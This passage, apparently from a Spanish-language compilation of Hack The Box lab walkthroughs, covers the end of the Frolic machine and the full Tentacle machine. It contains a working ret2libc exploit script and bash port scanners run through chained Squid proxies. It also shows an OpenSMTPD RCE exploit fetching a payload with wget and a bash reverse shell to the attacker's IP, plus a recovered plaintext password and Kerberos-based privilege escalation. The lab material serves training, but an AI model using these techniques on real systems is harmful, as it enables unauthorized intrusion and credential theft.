Constatamos que aparece multiples vecez. Esto quiere decir que podriamos lanzar el binario o mejor dicho el exploit multiples vecez hasta que 
esta direccion salga.


#### Creando el exploit en python {-}

```bash
cd /tmp
mkdir privesc
cd $!
touch exploit.py
vi exploit.py
```

El exploit seria:

```python
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

offset = 52
junk = "A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc = 0xb7568000

#141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
#1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
#15ba0b /bin/sh

system_addr_offset = 0x0003ada0
exit_addr_offset = 0x0002e9d0
bin_sh_addr_offset = 0x0015ba0b

system_addr = pack("<I", base_libc + system_addr_offset)
exit_addr = pack("<I", base_libc + exit_addr_offset)
bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

# Lanzamos el bucle infinito hasta que la direccion sea la buena
while True:
    #lanzamos el subprocess y almazenamos el codigo de estado en una variable ret
    ret = call(["/home/ayush/.binary/rop", payload])
    # Si el codigo de estado es exitoso salimos del programa
    if ret == 0:
        print("\n[+] Saliendo del programa...\n")
        sys.exit(0)
```

lanzamos el script con `python exploit.py` y esperamos de salir del bucle infinito para ganar la shell como root y leer la flag.

<!--chapter:end:61-Frolic/61-04-PrivilegeEscalation.Rmd-->

# Tentacle {-}

## Introduccion {-}

La maquina del dia se llama Tentacle.

El replay del live se puede ver aqui

[![S4vitaar Tentacle maquina](https://img.youtube.com/vi/hFIWuWVIDek/0.jpg)](https://www.youtube.com/watch?v=hFIWuWVIDek)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:62-Tentacle/62-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.224
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.224
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.224 -oG allPorts 
extractPorts allPorts
nmap -sCV -p22,53,88,3128 10.10.10.224 -oN targeted
```


| Puerto | Servicio         | Que se nos occure?    | Que falta? |
| ------ | ---------------- | --------------------- | ---------- |
| 22     | ssh              | Coneccion directa     |            |
| 53     | domain           |                       |            |
| 88     | Kerberos         | kerberoastable attack | usuario    |
| 3128   | http squid proxy | Fuzzing               |            |


### Analyzando el servicio Squid Proxy {-}

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.224:3128`. Vemos una pagina de error y podemos ver que el administrador es **j.nakazawa@realcorp.htb**. Tambien al fondo
de la pagina vemos un dominio `srv01.realcorp.htb`. Lo añadimos al `/etc/hosts`.

### Checkeo del dominio {-}

```bash
dig @10.10.10.224 realcorp.htb
dig @10.10.10.224 realcorp.htb ns
dig @10.10.10.224 realcorp.htb mx
dig @10.10.10.224 realcorp.htb axfr
```

Podemos ver en los nameservers que el dominio **ns.realcorp.htb** apunta a la ip `10.197.243.77`.

### Enumeracion de puertos con Squid Proxy {-}

El uso de un *Squid Proxy* nos hace pensar como atacante que podemos con el uso de **proxychain** enumerar puertos internos de la 
maquina victima.

Añadimos los datos del *squid proxy* al final de nuestro fichero `/etc/proxychains.conf`

```bash
http    10.10.10.224    3128
```

Desde aqui, podemos scanear la maquina con un **NMAP TCP connect scan**


```bash
proxychains nmap -sT -Pn -v -n 127.0.0.1
```

Aqui vemos que pasamos por el *Squid Proxy* para enumerar los puertos internos de la maquina victima. Como se ve muchos **(denied)** añadimos
el modo quiet al scaneo

```bash
proxychains -q nmap -sT -Pn -v -n 127.0.0.1
```

Vemos nuevos puertos como los 749 y 464. Como el servicio **DNS** esta abierto, podemos transmitar consultas DNS con **dnsenum**.

*** Enumeracion DNS con dnsenum {-}

Aqui utilizaremos fuerza bruta para enumerar mas subdominios.

```bash
dnsenum --dnsserver 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
```

Aqui vemos nuevos dominios

- ns.realcorp.htb -> 10.197.243.77
- proxy.realcorp.htb -> ns.realcorp.htb
- wpad.realcorp.htb -> 10.197.243.31

Añadimos los dominios al `/etc/hosts` con las mismas ip. Como pasamos por proxychains, podemos intentar enumerar puertos de estas ip.

```bash
proxychains -q nmap -sT -Pn -v -n 10.197.243.77
```

Aqui vemos que no podemos enumerar nada asin.


### Enumeracion de puertos de ips internas burlando el squid proxy {-}

Para explicar la movida vamos a utilizar imagenes.

Como nuestra configuracion proxychains esta echa con el comando 

```bash
http    10.10.10.224    3128
```

esto resulta en lo siguiente.


<div class="figure">
<img src="images/Tentacle-normal-proxychains-conf.png" alt="normal proxychains" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-87)normal proxychains</p>
</div>

Pasamos por internet para con el Squid Proxy scanear el 10.197.243.77. Pensamos que es un **Internal Squid Proxy** porque el dominio es 
`proxy.realcorp.htb`. Hemos podido comprobar que esta tecnica no funcciona.

Lo que queremos hacer es uzar otra configuracion del proxychains para que pasemos por el Squid Proxy hacia la interface interna del puerto 3128
de este mismo Squid Proxy.
pero de manera local para poder scanear el **Internal Squid Proxy**.



<div class="figure">
<img src="images/Tentacle-isp-proxychains-conf.png" alt="isp proxychains" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-88)isp proxychains</p>
</div>

La configuracion del proxychains.conf seria la siguiente.

```bash
http    10.10.10.224    3128
http    127.0.0.1   3128
```

> [ ! ] Notas: cuidado con el -Pn del tito ;)


Ahora ya podemos intentar de scanear los puertos de la ip interna.

```bash
proxychains -q nmap -sT -Pn -v -n 10.197.243.77
```

Ya vemos que podemos encontrar puertos. Como el nmap va lento, Tito nos muestra como crear un scaner con bash

```bash
#!/bin/bash

for prot in $(seq 1 65535); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

Como no vemos nigun puerto interesante vamos a intentar con la misma tecnica scanear otros sercios como el `wpad.realcorp.htb`

<div class="figure">
<img src="images/Tentacle-otherserv-proxychains-conf.png" alt="internal servers scanning" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-89)internal servers scanning</p>
</div>

Cambiamos el script de bash


```bash
#!/bin/bash

for prot in $(seq 1 65535); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.31/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

como no funcciona, esto significa que tenemos que modificar nuestro `/etc/proxychains.conf` para pasar tambien por el squid proxy interno.

```bash
http    10.10.10.224    3128
http    127.0.0.1   3128
http    10.197.243.77 3128
```

Si lanzamos el commando `proxychains nmap -sT -Pn -v -n 10.197.243.31 -p22` podemos ver lo siguiente.

<div class="figure">
<img src="images/Tentacle-proxychains-chain.png" alt="Proxychains chain" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-90)Proxychains chain</p>
</div>

Aqui podemos ver que el puerto esta abierto pero lo mas interesante es el *Strict chain* y vemos que pasamos por la 
10.10.10.224:3128 hacia el 127.0.0.1:3128 de esta misma maquina para despues pasar por la 10.197.243.77:3128 que es el 
Internal Squid Proxy para finalmente connectarnos a la 10.197.243.31:22.

Ya podemos lanzar el script en bash nuevamente y vemos que el puerto 80 esta abierto lo que significa que hay una web interna.

### Analysis de la web interna con proxychains {-}

podemos connectarnos a la web con el commando siguiente.

```bash
proxychains -q curl -s http://wpad.realcorp.htb
```

Aqui vemos que nos da un **403 Forbidden**. Como el dominio se llama wpad, miramos por google si encontramos una vulnerabilidad relacionado con esto.
Como ya es algo que hemos visto en el canal, pasamos directamente por [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad).

La pagina nos dice que muchos buscadores utilizan wpad que es *Web Proxy Auto-Discovery* para cargar configuraciones de proxy a nivel de red. Tambien
nos dice que los servidores WPAD proporcionan configuraciones de proxy a nivel de PATH URL (e.g., http://wpad.example.org/wpad.dat).

Miramos si este wpad.dat existe

```bash
proxychains -q curl -s http://wpad.realcorp.htb/wpad.dat | batcat -l js
```

y si, existe y podemos ver lo siguiente

<div class="figure">
<img src="images/Tentacle-wpad-dat.png" alt="wpad.dat" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-91)wpad.dat</p>
</div>

Aqui vemos un nuevo rango de ip `10.241.251.0 255.255.255.0` que no teniamos antes. El problema es que proxychains no tiene el binario ping configurado para
este uso. Tenemos que pasar nuevamente por un script en bash.

```bash
#!/bin/bash

for port in 21 22 25 80 88 443 445 8080 8081; do
        for i in $(seq 1 254); do
            proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] $port - OPEN on host $i" &
        done; wait
done; 
```

lanzando el script vemos algo que nos llama la atencion que es el puerto 25 abierto en el host 10.241.251.113. Lanzamos nmap para saber la version
y servicio que corre para este puerto.

```bash
proxychains nmap -sT -Pn -p25 -sCV 10.241.251.113
```

Podemos ver que es un **OpenSMTPD 2.0.0**

<!--chapter:end:62-Tentacle/62-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### OpenSMTPD 2.0.0 {-}

Buscamos si existe exploit para este servicio

```bash
searchsploit opensmtpd
```

vemos que existe un exploit de typo RCE para la version 6.6.1. Como tenemos la version 2.0.0 pensamos que se puede utilizar.

```bash
searchsploit -m 47984
mv 47984.py smtpd-exploit.py
cat smtpd-exploit.py
```

Viendo el codigo vemos que necessita una ip un puerto y un commando. Vemos que utilza un servicio mail para enviar el comando
a un recipiant que es root. Intentamos lanzarlo tal cual.

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el script con proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29'
    ```


Aqui vemos que no funcciona. puede ser porque el usuario root de este servicio no existe. Recordamos que hemos encontrado un email.
Tratamos de modificar el recipient para cambiar el root por j.nakazawa. Como el puerto 88 esta abierto primero utilizamos kerbrute para saber
si el usuario j.nakazawa existe.

1. creamos un fichero de usuarios y pegamos el usuario j.nakasawa
1. enumeramos usuarios con kerbrute

    ```bash
    kerbrute userenum --dc 10.10.10.224 -d realcorp.htb users
    ```

vemos que el usuario es valido. En el exploit, cambiamos el `s.send(b'RCPT TO:<root>\r\n')` por `s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')` y lanzamos 
nuevamente el exploit. Vemos que tenemos un GET en nuestro servidor web lo que significa que podemos ejecutar comandos y que tenemos conectividad con esta
maquina.

<!--chapter:end:62-Tentacle/62-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando acceso con el exploit opensmtpd {-}

1. creamos un ficher index.html que contiene

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.29/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit desde proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29 -O /dev/shm/rev
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'bash /dev/shm/rev
    ```

Ya hemos ganado acceso al contenedor como root.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag pero no es el caso. Vemos un fichero `.msmtprc` en el directorio home del usuario j.nakazawa

```bash
cd /home/j.nakazawa
cat .msmtprc
```

Podemos ver una contraseña. Intentamos connectarnos por ssh a la maquina victima pero la credenciales no son validas. Ademas podemos ver
un mensaje de error un poco raro que habla de GSSAPI-With-MIC. Buscando por internet vemos que el servicio de authentification del ssh
esta usando authenticacion Kerberos.

### Configuracion de krb5 {-}

```bash
apt install krb5-user
dpkg-reconfigure krb5-config

Reino predeterminado de la version5 de Kerberos: REALCORP.HTB
Añadir las config en el ficher /etc/krb5.conf: Si
Servidores de Kerberos para su reino: 10.10.10.224
Servidor administrativo para su reino: 10.10.10.224
```

Aqui podemos modificar el fichero `/etc/krb5.conf` de configuracion para tener lo siguiente

```bash
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
        .REALCORP.HTB = REALCORP.HTB
        REALCORP.HTB = REALCORP.HTB

```

Cacheamos las credenciales del usuario al kerberos con el commando

```bash
> kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
```

Vemos que un fichero `/tmp/krb5cc_0` a sido creado y ahora podemos connectar por ssh 

```bash
ssh j.nakazawa@10.10.10.224
```

Ya estamos en la maquina 10.10.10.224 y podemos leer la flag.

<!--chapter:end:62-Tentacle/62-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
cat /etc/crontab
```

Aqui vemos que hay una tarea que se ejecuta por el usuario admin cada minuto. El script es `/usr/local/bin/log_backup.sh`
Este archivo basicamente copia lo que hay en el directorio `/var/log/squid` en el directorio `/home/admin`.

```bash
cd /home/admin
cd /var/log/
ls -la | grep squid
```

Vemos que podemos escribir en el /var/log/squid pero no podemos entrar en el /home/admin.

Buscando por internet, vemos que existe un fichero que se puede poner en el directorio del usuario y que permite dar
conneccion con kerberos. Este fichero seria .k5login.


```bash
cd /var/log/squid/
echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Esperamos un poco y lanzamos desde nuestra maquina de atacante una conneccion ssh

```bash
ssh admin@10.10.10.224
```

Ahora que estamos conectados como admin miramos como nos podemos pasar a root


```bash
cd /
find / -type f -user admin 2>/dev/null
find / -type f -user admin 2>/dev/null | grep -v "proc"
find / -type f -user admin 2>/dev/null | grep -v -E "proc|cgroup"
find / -type f -group admin 2>/dev/null | grep -v -E "proc|cgroup"
```

Encontramos un fichero `/etc/krb5.keytab`

```bash
cat /etc/krb5.keytab
file /etc/krb5.keytab
```

Si buscamos lo que es por internet vemos que hay una via potencial de rootear esta maquina usando este fichero. La idea aqui seria
de crear un nuevo principal al usuario root cambiandole la contraseña.

```bash
klist -k /etc/krb5.keytab
kadmin -h
kadmin -kt /etc/krb5.keytab
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
?
addprinc root@REALCORP.HTB
password: test123
reenter password: test123
exit
```

Si ahora lanzamos 

```bash
ksu
Kerberos password for root@REALCORP.HTB: test123
whoami

#Output
root
```

Ya somos root y podemos leer la flag

<!--chapter:end:62-Tentacle/62-04-PrivilegeEscalation.Rmd-->

